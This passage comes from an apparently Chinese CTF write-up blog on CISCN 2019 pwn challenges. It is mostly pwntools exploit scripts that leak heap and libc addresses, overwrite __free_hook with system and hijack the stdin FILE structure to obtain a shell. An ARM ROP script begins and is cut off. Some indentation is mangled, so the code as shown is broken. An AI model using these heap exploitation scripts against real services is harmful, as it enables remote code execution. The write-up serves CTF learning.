class="line">dele(<span class="number">3</span>)</span><br><span class="line">p.writeline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">p.writeline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">heap=u64((p.readuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]).ljust(<span class="number">8</span>,<span class="built_in">chr</span>(<span class="number">0x0</span>)))-<span class="number">0x30</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line">edit(<span class="number">3</span>,p64(heap+<span class="number">0xa0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  payload=p64(<span class="number">0x90</span>)*<span class="number">3</span>+<span class="built_in">chr</span>(<span class="number">0x90</span>)</span><br><span class="line">  new(<span class="number">8</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">  edit(<span class="number">4</span>,p64(<span class="number">0x31</span>)*<span class="number">2</span>+p64(heap+<span class="number">0x20</span>))</span><br><span class="line">  </span><br><span class="line">  new(<span class="number">0</span>,payload)</span><br><span class="line">  </span><br><span class="line">  payload=p64(<span class="number">0x0</span>)+p64(<span class="number">0x91</span>)+p64(<span class="number">0x4040a8</span>-<span class="number">0x18</span>)+p32(<span class="number">0x4040a8</span>-<span class="number">0x10</span>)</span><br><span class="line">  new(<span class="number">9</span>,payload)</span><br><span class="line">  </span><br><span class="line">  dele(<span class="number">5</span>)</span><br><span class="line">  <span class="comment"># gdb.attach(p,&#x27;b *0x401513&#x27;)</span></span><br><span class="line">  edit(<span class="number">9</span>,p64(<span class="number">0x404040</span>)+p64(<span class="number">0x403f90</span>)+p64(<span class="number">0x404090</span>))</span><br><span class="line">  </span><br><span class="line">  edit(<span class="number">6</span>,p64(<span class="number">0xff</span>))</span><br><span class="line">  p.writeline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">  p.writeline(<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">  free_addr=u64((p.readuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>]).ljust(<span class="number">8</span>,<span class="built_in">chr</span>(<span class="number">0x0</span>)))</span><br><span class="line">  free_hook=free_addr+libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]-libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">  system=(free_addr+libc.symbols[<span class="string">&#x27;system&#x27;</span>]-libc.symbols[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">  edit(<span class="number">8</span>,p64(free_hook))</span><br><span class="line">  </span><br><span class="line">  edit(<span class="number">6</span>,p64(system))</span><br><span class="line">  </span><br><span class="line">  edit(<span class="number">1</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  p.writeline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">  p.readuntil(<span class="string">&#x27;Index:&#x27;</span>)</span><br><span class="line">  p.writeline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">  </span><br><span class="line">  p.interactive()</span><br><span class="line">  p.close()</span><br></pre></td></tr></table></figure>

<h3 id="pwn7-kindom-❌"><a href="#pwn7-kindom-❌" class="headerlink" title="pwn7-kindom ❌"></a>pwn7-kindom ❌</h3><p>kindom 没做出来，主要原因是 没有去尝试，只是脑海里理论伪证了一遍…<br>漏洞是UAF，泄露一开始没想出来，但其实还是很简单的</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">expel</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Who has displeased you, master?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Tell me his index number:&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;i);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= <span class="number">0</span> &amp;&amp; i &lt;= <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( servant[i] )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Ok, I&#x27;ll kill %s for you, monsieur.\n&quot;</span>, *(_QWORD *)servant[i]);</span><br><span class="line">            <span class="built_in">free</span>(servant[i]);                         <span class="comment">// double free</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;I don&#x27;t know him, monsieur.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为在分配时，都用的是calloc</p>
<p>所以泄露肯定不能分配后泄露，而是通过<code>free</code>间接来泄露，所以直接重用一个0x18的chunk，<code>free</code>之后就可以泄露堆地址了</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( !servant[j] )</span><br><span class="line">&#123;</span><br><span class="line">  servant[j] = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, <span class="number">0x10uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !servant[j] )</span><br><span class="line">  &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Calloc error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;This is your NO.%d servent.\n&quot;</span>, j);</span><br><span class="line">  *((_DWORD *)servant[j] + <span class="number">2</span>) = <span class="number">10</span>;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Input the name&#x27;s size of this servent:&quot;</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;size);</span><br><span class="line">  v2 = (<span class="type">void</span> **)servant[j];</span><br><span class="line">  *v2 = <span class="built_in">calloc</span>(<span class="number">1uLL</span>, (<span class="type">unsigned</span> <span class="type">int</span>)size);</span><br></pre></td></tr></table></figure>

<p>在attack函数中，出题人疯狂暗示，一个任意地址写0，另一个是<code>sacnf</code>函数，肯定是写stdin的<code>_IO_2_1_stdin_</code>中的<code>__IO_buf_base</code>劫持stdin结构体虚函数表的套路</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __noreturn <span class="title">attack</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">char</span> buf; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"><span class="type">size_t</span> n; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"><span class="type">void</span> *s; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"><span class="type">void</span> *ptr; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( flag == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you want to use excalibur?&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">2uLL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( buf == <span class="string">&#x27;y&#x27;</span> || buf == <span class="string">&#x27;Y&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Where do you want to wipe out?&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%lu&quot;</span>, &amp;s);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;How much power do you want to use?(0-8)&quot;</span>);</span><br><span class="line">    _isoc99_scanf(<span class="string">&quot;%u&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)n &gt; <span class="number">8</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;The max power is 8.&quot;</span>);</span><br><span class="line">      <span class="built_in">LODWORD</span>(n) = <span class="number">8</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">1u</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;EX-calibur!!!\n\n\n&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, (<span class="type">unsigned</span> <span class="type">int</span>)n);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> ( <span class="built_in">HIDWORD</span>(n) = <span class="number">0</span>; <span class="built_in">SHIDWORD</span>(n) &lt;= <span class="number">9</span>; ++<span class="built_in">HIDWORD</span>(n) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( servant[<span class="built_in">SHIDWORD</span>(n)] )</span><br><span class="line">    *(_DWORD *)&amp;monster -= *((_DWORD *)servant[<span class="built_in">SHIDWORD</span>(n)] + <span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ( *(_DWORD *)&amp;monster &lt;= <span class="number">0</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You have won, master.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Leave your name please:&quot;</span>);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(<span class="number">0x200uLL</span>);</span><br><span class="line">  _isoc99_scanf(<span class="string">&quot;%512s&quot;</span>, ptr);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Master, the world will remember you.&quot;</span>);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;......&quot;</span>);</span><br><span class="line">  <span class="built_in">sleep</span>(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Just kidding, no one will remember you.&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>于是，通过overlap泄露地址，之后劫持stdin之后，修改<code>__free_hook</code> 来getshell即可<br>注意在Getshell的位置:<br>直接利用stdin的<code>_IO_write_base</code>等指针写<code>__free_hook</code>还是第一次见，威力很大</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#./usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">r = <span class="keyword">lambda</span> :io.recv()</span><br><span class="line">rn = <span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">rld = <span class="keyword">lambda</span>: io.recvline(keepends = <span class="literal">False</span>)</span><br><span class="line">rufd = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">False</span>)</span><br><span class="line">rud = <span class="keyword">lambda</span> x:io.recvuntil(x,drop=<span class="literal">True</span>)</span><br><span class="line">rl = <span class="keyword">lambda</span> :io.recvline()</span><br><span class="line">se = <span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sel = <span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sea = <span class="keyword">lambda</span> x:io.sendafter(x)</span><br><span class="line">sela = <span class="keyword">lambda</span> x:io.sendlineafter(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recruit</span>(<span class="params">size,namesize=[],name=[]</span>):</span><br><span class="line">    ru(<span class="string">&#x27;Give me your choice:\n&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    ru(<span class="string">&#x27;How many servents do you want to rescruit?\n&#x27;</span>)</span><br><span class="line">    sel(<span class="built_in">str</span>(size))</span><br><span class="line">    <span class="keyword">if</span> size&lt;<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size):</span><br><span class="line">        ru(<span class="string">&#x27;Input the name\&#x27;s size of this servent:&#x27;</span>)</span><br><span class="line">        sel(<span class="built_in">str</span>(namesize[i]))</span><br><span class="line">        ru(<span class="string">&quot;Input the name of this servent:&quot;</span>)</span><br><span class="line">        se(name[i])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">def</span> <span class="title function_">expel</span>(<span class="params">index</span>):</span><br><span class="line">            sel(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">            ru(<span class="string">&quot;Tell me his index number:\n&quot;</span>)</span><br><span class="line">            sel(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">            <span class="keyword">def</span> <span class="title function_">buy</span>(<span class="params">choice</span>):</span><br><span class="line">                ru(<span class="string">&#x27;Give me your choice:\n&#x27;</span>)</span><br><span class="line">                sel(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">                ru(<span class="string">&#x27;2.Excalibur      --90000yuan\n&#x27;</span>)</span><br><span class="line">                sel(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                <span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">order=[]</span>):</span><br><span class="line">                    command = <span class="string">&#x27;&#x27;</span></span><br><span class="line">                    <span class="keyword">for</span> item <span class="keyword">in</span> order:</span><br><span class="line">                        command += <span class="built_in">str</span>(item)+<span class="string">&#x27;\n&#x27;</span></span><br><span class="line">                        log.info(<span class="string">&#x27;gdb command:\n&#x27;</span>+command)</span><br><span class="line">                        gdb.attach(io,command)</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">def</span> <span class="title function_">exploit</span>(<span class="params">flag</span>):</span><br><span class="line">                            ru(<span class="string">&#x27;How much money do you want?\n&#x27;</span>)</span><br><span class="line">                            sel(<span class="built_in">str</span>(<span class="number">1000</span>))</span><br><span class="line"></span><br><span class="line">                            recruit(-<span class="number">100000</span>)</span><br><span class="line">                            buy(<span class="number">2</span>)</span><br><span class="line">                            <span class="comment">#leaking heap</span></span><br><span class="line">                            recruit(<span class="number">4</span>,[<span class="number">0x18</span>,<span class="number">0x18</span>,<span class="number">0x18</span>,<span class="number">0x18</span>],[p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>),<span class="string">&#x27;\0&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>,<span class="string">&#x27;\0&#x27;</span>])</span><br><span class="line">                            sleep(<span class="number">0.5</span>)</span><br><span class="line">                            expel(<span class="number">1</span>)</span><br><span class="line">                            expel(<span class="number">2</span>)</span><br><span class="line">                            recruit(<span class="number">1</span>,[<span class="number">0x18</span>],[p64(<span class="number">0</span>)+p64(<span class="number">10000</span>)])</span><br><span class="line">                            sleep(<span class="number">0.5</span>)</span><br><span class="line">                            expel(<span class="number">3</span>)</span><br><span class="line">                            expel(<span class="number">1</span>)</span><br><span class="line">                            expel(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">                            io.recvuntil(<span class="string">&quot;Ok, I&#x27;ll kill &quot;</span>)</span><br><span class="line">                            heap = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0xc0</span></span><br><span class="line">                            log.info(<span class="string">&quot;heap:&quot;</span>+<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># leaking libc</span></span><br><span class="line">                            expel(<span class="number">1</span>)</span><br><span class="line">                            expel(<span class="number">3</span>)</span><br><span class="line">                            recruit(<span class="number">3</span>,[<span class="number">0x18</span>,<span class="number">0x28</span>,<span class="number">0x18</span>],[p64(heap+<span class="number">0x30</span>)+p64(<span class="number">100000</span>),<span class="string">&#x27;\0&#x27;</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xa1</span>)])</span><br><span class="line">                            sleep(<span class="number">0.5</span>)</span><br><span class="line">                            expel(<span class="number">1</span>)</span><br><span class="line">                            expel(<span class="number">3</span>)</span><br><span class="line">                            io.recvuntil(<span class="string">&quot;Ok, I&#x27;ll kill &quot;</span>)</span><br><span class="line">                            libc.address = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x3c4b78</span></span><br><span class="line">                            log.info(<span class="string">&quot;libc.address:&quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">                            _IO_2_1_stdin_ = libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>]</span><br><span class="line">                            log.info(<span class="string">&#x27;_IO_2_1_stdin_:&#x27;</span>+<span class="built_in">hex</span>(_IO_2_1_stdin_))</span><br><span class="line">                            __free_hook = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">                            log.info(<span class="string">&quot;_free_hook:&quot;</span>+<span class="built_in">hex</span>(__free_hook))</span><br><span class="line"></span><br><span class="line">                            expel(<span class="number">6</span>)</span><br><span class="line">                            expel(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">                            <span class="comment"># calculate monster&#x27;s blood, Fxxk 666</span></span><br><span class="line">                            temp = <span class="number">2</span>*(libc.address+<span class="number">0x3c4b78</span>)&amp;<span class="number">0xffffffff</span></span><br><span class="line">                            <span class="keyword">if</span> temp&gt;<span class="number">0xffffffff</span>:</span><br><span class="line">                                temp = temp&amp;<span class="number">0xffffffff</span></span><br><span class="line"></span><br><span class="line">                                <span class="keyword">if</span> <span class="number">9990</span>-temp &lt;<span class="number">0</span>:</span><br><span class="line">                                    y = <span class="number">0xffffffff</span>+<span class="number">9990</span>-temp</span><br><span class="line"></span><br><span class="line">                                    <span class="keyword">if</span> y%<span class="number">3</span>!=<span class="number">0</span>:</span><br><span class="line">                                        y = y+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                                        <span class="keyword">if</span> y%<span class="number">3</span>!=<span class="number">0</span>:</span><br><span class="line">                                            y = y+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                                            x = y/<span class="number">3</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                                            recruit(<span class="number">1</span>,[<span class="number">0x18</span>],[p64(<span class="number">0x0</span>)+p64(x)])</span><br><span class="line">                                            <span class="comment"># write _IO_2_1_stdin_ _IO_buf_base</span></span><br><span class="line"></span><br><span class="line">                                            <span class="comment">#z([&#x27;b *&#x27;+hex(proc_base+0x1205),</span></span><br><span class="line">                                            <span class="comment">#   &#x27;b *&#x27;+hex(proc_base+0x1134)])</span></span><br><span class="line"></span><br><span class="line">                                            ru(<span class="string">&#x27;Give me your choice:\n&#x27;</span>)</span><br><span class="line">                                            sel(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">                                            ru(<span class="string">&#x27;Do you want to use excalibur?\n&#x27;</span>)</span><br><span class="line">                                            sel(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">                                            ru(<span class="string">&#x27;Where do you want to wipe out?&#x27;</span>)</span><br><span class="line">                                            sel(<span class="built_in">str</span>(_IO_2_1_stdin_+<span class="number">0x38</span>))</span><br><span class="line">                                            ru(<span class="string">&#x27;How much power do you want to use?(0-8)&#x27;</span>)</span><br><span class="line">                                            sel(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">                                            ru(<span class="string">&#x27;Leave your name please:\n&#x27;</span>)</span><br><span class="line">                                            sel(<span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">                                                +p64(__free_hook)*<span class="number">3</span>+p64(libc.address+<span class="number">0x3c67c8</span>)+<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x3c</span>+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">                                            io.interactive()</span><br><span class="line"></span><br><span class="line">                                            <span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">                                                context.binary = <span class="string">&#x27;./kindom&#x27;</span></span><br><span class="line">                                                context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>,<span class="string">&#x27;-l&#x27;</span>,<span class="string">&#x27;136&#x27;</span>]</span><br><span class="line">                                                <span class="comment"># context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">                                                elf = ELF(<span class="string">&#x27;./kindom&#x27;</span>)</span><br><span class="line">                                                <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">                                                    io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">                                                    libc=ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">                                                    exploit(<span class="number">0</span>)</span><br><span class="line">                                                <span class="keyword">else</span>:</span><br><span class="line">                                                    io = process(<span class="string">&#x27;./kindom&#x27;</span>)</span><br><span class="line">                                                    libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">                                                    proc_base = io.libs()[<span class="string">&#x27;/ctf/work/CTFPro/2019/ciscn2019-area/day2/pwn7-kingdom/kindom&#x27;</span>]</span><br><span class="line">                                                    log.info(<span class="string">&#x27;proc_base:&#x27;</span>+<span class="built_in">hex</span>(proc_base))</span><br><span class="line">                                                    libc_base= io.libs()[<span class="string">&#x27;/lib/x86_64-linux-gnu/ld-2.23.so&#x27;</span>]</span><br><span class="line">                                                    log.info(<span class="string">&#x27;libc_base:&#x27;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">                                                    exploit(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
<h3 id="pwn8-attach-❌"><a href="#pwn8-attach-❌" class="headerlink" title="pwn8-attach ❌"></a>pwn8-attach ❌</h3><p>惊现ARM-32bit的题目，是一个ARM32下的简单ROP 注意两点:</p>
<ol>
<li>熟悉ARM，MIPS，PPC等题目环境的迅速搭建</li>
<li>熟悉ARM汇编，注意ARM指令，学会在ARM下构造ROP Chain</li>
</ol>
<p>题目本身比较简单，但是没做出来就比较尴尬了</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = <span class="string">&quot;./attach&quot;</span></span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port = <span class="number">10002</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./attach&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">io = remote(host,port)</span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span 